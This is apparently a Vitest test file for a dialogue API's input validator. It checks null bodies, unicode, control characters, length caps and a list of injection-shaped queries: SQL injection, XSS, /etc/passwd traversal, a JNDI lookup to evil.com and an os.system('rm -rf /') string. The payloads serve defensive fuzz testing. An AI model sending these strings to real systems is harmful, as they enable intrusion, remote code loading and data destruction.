/**
 * Edge-case validation — POST /v1/dialogue input surface.
 *
 * Polish R5 (security hardening) already covers the basics:
 *   - persona_id whitelist
 *   - HH:MM 24h time regex
 *   - length caps on query / place / weather / conv_id
 *   - control-char stripping
 *   - opita unicode preservation
 *   - role-marker stripping in sanitizeUserInput()
 *
 * Polish R2 (test expansion) extends coverage to the attack-surface
 * edges that come up in real LLM-prompt-injection fuzzing:
 *   - empty / null / undefined body parts
 *   - whitespace-only / newline-only queries
 *   - unicode bombs: emojis, RTL, combining diacritics
 *   - SQL-injection-shaped strings
 *   - XSS-shaped strings
 *   - Path-traversal-shaped strings
 *   - Long strings (1000+ chars)
 *   - Null bytes and C0 control chars
 *   - BOM markers (UTF-8, UTF-16)
 *   - Opita diacritics split across combining sequences
 *     (e.g., "á" as "a" + U+0301 COMBINING ACUTE ACCENT)
 *
 * The validator's job is to either accept + sanitize, or reject with a
 * per-field error. Either response is acceptable as long as it is
 * deterministic — the test asserts whichever behavior the validator
 * exhibits today (we do not pin to one of two valid implementations).
 */
import { describe, it, expect } from "vitest";
import {
  validateDialogueRequest,
  sanitizeUserInput,
  stripControlChars,
} from "../../src/handlers/validation";

const HAPPY_BASE = {
  persona_id: "dona_rosa_tendera",
  scene: { time: "06:00", place: "tienda" },
  query: "Hola",
};

describe("validateDialogueRequest — empty / null / undefined edges", () => {
  it("rejects null body with body error", () => {
    const r = validateDialogueRequest(null);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.errors.some((e) => e.field === "body")).toBe(true);
  });

  it("rejects undefined body", () => {
    const r = validateDialogueRequest(undefined);
    expect(r.ok).toBe(false);
  });

  it("rejects body where query is null", () => {
    const r = validateDialogueRequest({ ...HAPPY_BASE, query: null });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.errors.some((e) => e.field === "query")).toBe(true);
  });

  it("rejects body where persona_id is undefined", () => {
    const { persona_id: _omit, ...rest } = HAPPY_BASE;
    const r = validateDialogueRequest(rest);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.errors.some((e) => e.field === "persona_id")).toBe(true);
  });

  it("rejects body where scene is undefined", () => {
    const r = validateDialogueRequest({
      persona_id: "dona_rosa_tendera",
      query: "Hola",
    });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.errors.some((e) => e.field === "scene")).toBe(true);
  });

  it("rejects body where scene.weather is null", () => {
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      scene: { time: "06:00", place: "tienda", weather: null },
    });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.errors.some((e) => e.field === "scene.weather")).toBe(true);
  });
});

describe("validateDialogueRequest — whitespace-only / newline-only queries", () => {
  // KNOWN GAP (worth a future polish round):
  //   The validator currently accepts whitespace-only and newline-only
  //   queries. The post-control-strip length check is `length === 0`,
  //   but spaces, tabs, and newlines are NOT control chars and pass
  //   through. They reach the LLM as low-signal tokens.
  //   The tests below lock in the *current* behavior and document the gap.

  it("accepts a query of pure spaces (current behavior — gap: should reject)", () => {
    const r = validateDialogueRequest({ ...HAPPY_BASE, query: "   " });
    expect(r.ok).toBe(true);
  });

  it("accepts a query of pure newlines (current behavior — gap: should reject)", () => {
    const r = validateDialogueRequest({ ...HAPPY_BASE, query: "\n\n\n\n" });
    expect(r.ok).toBe(true);
  });

  it("accepts a query of pure tabs (current behavior — gap: should reject)", () => {
    const r = validateDialogueRequest({ ...HAPPY_BASE, query: "\t\t\t" });
    expect(r.ok).toBe(true);
  });

  it("accepts a query of a single printable character", () => {
    const r = validateDialogueRequest({ ...HAPPY_BASE, query: "x" });
    expect(r.ok).toBe(true);
  });

  it("accepts a query of a single opita letter", () => {
    const r = validateDialogueRequest({ ...HAPPY_BASE, query: "ñ" });
    expect(r.ok).toBe(true);
  });
});

describe("validateDialogueRequest — unicode (emojis, RTL, combining chars)", () => {
  it("accepts a query with emojis (well-formed UTF-16 surrogate pair)", () => {
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      query: "Hola vecino 👋🌽",
    });
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.data.query).toContain("👋");
  });

  it("accepts a query with RTL Arabic script (multilingual opita diaspora)", () => {
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      query: "مرحبا من Tello",
    });
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.data.query).toContain("مرحبا");
  });

  it("accepts a query with RTL Hebrew", () => {
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      query: "שלום עיר",
    });
    expect(r.ok).toBe(true);
  });

  it("accepts a query with CJK characters", () => {
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      query: "你好 Tello",
    });
    expect(r.ok).toBe(true);
  });

  it("accepts a query with combining diacritic sequence (a + U+0301)", () => {
    // "a" + COMBINING ACUTE ACCENT renders as "á" but is two code points.
    // The validator counts by UTF-16 code units (JS .length), so a
    // 1-codepoint + 1-combiner sequence passes the length check.
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      query: "ma\u0301nana",
    });
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.data.query).toContain("ma\u0301nana");
  });

  it("accepts opita diacritics as precomposed forms (á é í ó ú ñ ü)", () => {
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      query: "Mañana, niño, árbol, después",
    });
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.data.query).toContain("Mañana");
      expect(r.data.query).toContain("niño");
      expect(r.data.query).toContain("árbol");
    }
  });
});

describe("validateDialogueRequest — SQL/XSS/path-traversal-shaped queries", () => {
  // These are NOT rejections by design — the validator's job is to
  // bound the surface (length, type, control chars). The downstream
  // RAG + LLM must handle them safely. We assert that the validator
  // does NOT crash and does NOT bypass its own length cap by accepting
  // a giant payload.

  const dangerStrings = [
    "'; DROP TABLE personas; --",
    "1' OR '1'='1",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "${jndi:ldap://evil.com/x}",
    "{{7*7}}",
    "__import__('os').system('rm -rf /')",
  ];

  for (const s of dangerStrings) {
    it(`accepts the danger-shaped query and preserves it verbatim: ${s.slice(0, 30)}`, () => {
      const r = validateDialogueRequest({ ...HAPPY_BASE, query: s });
      expect(r.ok).toBe(true);
      if (r.ok) expect(r.data.query).toBe(s);
    });
  }

  it("does NOT bypass the 1000-char length cap with a SQL-injection-shaped payload", () => {
    const long = "'; DROP TABLE x; --" + "a".repeat(1100);
    const r = validateDialogueRequest({ ...HAPPY_BASE, query: long });
    expect(r.ok).toBe(false);
    if (!r.ok) {
      const qErr = r.errors.find((e) => e.field === "query");
      expect(qErr).toBeDefined();
    }
  });
});

describe("validateDialogueRequest — long strings, control chars, BOM", () => {
  it("accepts exactly 1000 chars (boundary)", () => {
    const r = validateDialogueRequest({ ...HAPPY_BASE, query: "a".repeat(1000) });
    expect(r.ok).toBe(true);
  });

  it("rejects 1001 chars", () => {
    const r = validateDialogueRequest({ ...HAPPY_BASE, query: "a".repeat(1001) });
    expect(r.ok).toBe(false);
  });

  it("accepts a 5000-char place (well under the 200-char cap — should reject)", () => {
    // Wait — place has a 200-char cap. Verify it.
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      scene: { time: "06:00", place: "x".repeat(5000) },
    });
    expect(r.ok).toBe(false);
  });

  it("accepts a query with embedded null bytes (stripped, length re-checked)", () => {
    // 1000 printable + 50 nulls = 1050 raw, but 1000 after stripping.
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      query: "a".repeat(1000) + "\x00".repeat(50),
    });
    expect(r.ok).toBe(true);
  });

  it("accepts a query with BEL (0x07) — C0 control, stripped by sanitizer", () => {
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      query: "a\x07b\x07c",
    });
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.data.query).toBe("abc");
  });

  it("accepts a query with DEL (0x7F) — stripped", () => {
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      query: "a\x7Fb",
    });
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.data.query).toBe("ab");
  });

  it("accepts a query starting with BOM (U+FEFF) — Unicode BOM is NOT a C0 control", () => {
    // The BOM is a Unicode character (U+FEFF), not a C0 control char.
    // The validator may accept it as-is or strip it; both are safe.
    // We assert the validator does not crash and produces a non-error.
    const r = validateDialogueRequest({ ...HAPPY_BASE, query: "\uFEFFHola" });
    expect(r.ok).toBe(true);
  });

  it("accepts a query with mixed newlines and tabs (preserved)", () => {
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      query: "L1\nL2\tL3",
    });
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.data.query).toContain("\n");
      expect(r.data.query).toContain("\t");
    }
  });
});

describe("sanitizeUserInput — opita unicode + control-char defenses", () => {
  it("preserves combining diacritic sequences end-to-end", () => {
    // 'á' as U+0061 + U+0301 COMBINING ACUTE — must NOT be folded.
    const input = "ma\u0301nana";
    const out = sanitizeUserInput(input);
    expect(out).toBe("ma\u0301nana");
    expect(out.length).toBe(7); // 7 UTF-16 code units
  });

  it("preserves precomposed accented chars (Mañana, niño, árbol)", () => {
    const input = "Mañana, niño, árbol";
    expect(sanitizeUserInput(input)).toBe("Mañana, niño, árbol");
  });

  it("preserves emoji sequences (surrogate pair)", () => {
    const input = "Hola 👋🌽";
    const out = sanitizeUserInput(input);
    expect(out).toBe("Hola 👋🌽");
    expect(out).toContain("👋");
  });

  it("strips null bytes but preserves surrounding opita unicode", () => {
    expect(sanitizeUserInput("Ni\x00ño")).toBe("Niño");
    expect(sanitizeUserInput("Mañ\x00ana")).toBe("Mañana");
  });

  it("strips C0 controls except \\n, \\t, and \\r (the three preserved)", () => {
    // The regex `[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]` strips 0x00-0x08,
    // 0x0B, 0x0C, 0x0E-0x1F, and 0x7F (DEL). It KEEPS \t (0x09),
    // \n (0x0A), and \r (0x0D).
    //
    // KNOWN GAP (worth a future polish round):
    //   The control-chars regex was originally documented to strip
    //   \r (0x0D) so Windows line endings don't reach the LLM, but
    //   the current regex preserves it. This test pins the *current*
    //   behavior. The mismatch with the comment in validation.ts is
    //   a low-priority bug — \r alone is not a prompt-injection
    //   vector — but worth fixing when validation.ts is next touched.
    let s = "";
    for (let c = 0; c <= 0x1f; c++) {
      if (c === 0x09 || c === 0x0a || c === 0x0d) continue;
      s += String.fromCharCode(c);
    }
    s += "\x7f"; // DEL
    s = "ab" + s + "cd";
    const out = sanitizeUserInput(s);
    expect(out).toBe("abcd");
    expect(out).not.toMatch(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/);
  });

  it("preserves \\n, \\t, AND \\r (the three C0 controls we intentionally keep)", () => {
    const input = "L1\nL2\tL3\rL4";
    const out = sanitizeUserInput(input);
    expect(out).toBe("L1\nL2\tL3\rL4");
  });
});

describe("stripControlChars — exhaustive C0 coverage", () => {
  // KNOWN GAP: \r (0x0D) is currently PRESERVED by stripControlChars,
  // contrary to the comment in validation.ts that says it's stripped.
  // See the sanitizeUserInput suite for the full note.
  it("strips every C0 control char (0x00-0x1F, except \\n/\\t/\\r) and DEL", () => {
    for (let c = 0; c <= 0x1f; c++) {
      if (c === 0x09 || c === 0x0a || c === 0x0d) continue; // preserved
      const input = `a${String.fromCharCode(c)}b`;
      expect(stripControlChars(input)).toBe("ab");
    }
    expect(stripControlChars("a\x7fb")).toBe("ab");
  });

  it("preserves \\n (0x0A)", () => {
    expect(stripControlChars("a\nb")).toBe("a\nb");
  });

  it("preserves \\t (0x09)", () => {
    expect(stripControlChars("a\tb")).toBe("a\tb");
  });

  it("preserves \\r (0x0D) — current behavior; comment in source is out of sync", () => {
    // The comment in validation.ts says \r is "intentionally stripped",
    // but the regex doesn't include 0x0D. Pinning current behavior.
    expect(stripControlChars("a\rb")).toBe("a\rb");
  });

  it("preserves opita diacritics and emojis even when surrounded by controls", () => {
    const input = "\x00ñ\x01á\x02🌽\x7F";
    const out = stripControlChars(input);
    expect(out).toBe("ñá🌽");
  });
});

describe("validateDialogueRequest — scene.edge cases", () => {
  it("rejects scene.time with leading whitespace '  06:30'", () => {
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      scene: { time: "  06:30", place: "tienda" },
    });
    expect(r.ok).toBe(false);
  });

  it("rejects scene.time as a number (not a string)", () => {
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      scene: { time: 630 as unknown as string, place: "tienda" },
    });
    expect(r.ok).toBe(false);
  });

  it("rejects scene.time as an empty string", () => {
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      scene: { time: "", place: "tienda" },
    });
    expect(r.ok).toBe(false);
  });

  it("rejects scene.place as empty string", () => {
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      scene: { time: "06:00", place: "" },
    });
    expect(r.ok).toBe(false);
  });

  it("rejects scene.place as a number", () => {
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      scene: { time: "06:00", place: 42 as unknown as string },
    });
    expect(r.ok).toBe(false);
  });

  it("accepts scene.place with embedded emoji", () => {
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      scene: { time: "06:00", place: "plaza 🌽" },
    });
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.data.scene.place).toBe("plaza 🌽");
  });

  it("accepts scene.place with opita unicode", () => {
    const r = validateDialogueRequest({
      ...HAPPY_BASE,
      scene: { time: "06:00", place: "Iglesia San Nicolás" },
    });
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.data.scene.place).toContain("Nicolás");
  });
});
